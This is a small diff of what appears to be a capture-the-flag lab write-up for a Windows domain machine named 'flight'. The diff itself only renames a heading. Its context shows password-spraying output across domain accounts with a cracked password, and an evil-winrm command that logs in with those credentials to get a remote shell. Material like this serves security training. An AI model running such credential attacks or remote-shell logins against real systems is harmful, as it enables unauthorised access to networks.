@@ -7,7 +7,7 @@
 	2. [Cracking_The_Hash](#Cracking_The_Hash)
 	3. [SMB-Enum-using-svc_apache](#SMB-Enum-using-svc_apache)
 	4. [RID-Brute_Using-svc_apache](#RID-Brute_Using-svc_apache)
-	5. [Failed_Evil-WinRM_for_S.moon](#Failed_Evil-WinRM_for_S.moon)
+	5. [Failed_Evil-WinRM_for_User_Smoon](#Failed_Evil-WinRM_for_User_Smoon)
 
 ### `Box-Info`
 ```
@@ -176,7 +176,7 @@ SMB         10.10.11.187    445    G0               [-] flight\O.Possum:S@Ss!K@*
 SMB         10.10.11.187    445    G0               [-] flight\WebDevs:S@Ss!K@*t13 STATUS_LOGON_FAILURE 
 ```
 
-###### Failed_Evil-WinRM_for_S.moon
+###### Failed_Evil-WinRM_for_User_Smoon
 ```
 # evil-winrm -i 10.10.11.187 -u 'S.Moon' -p 'S@Ss!K@*t13'
 Evil-WinRM shell v3.5
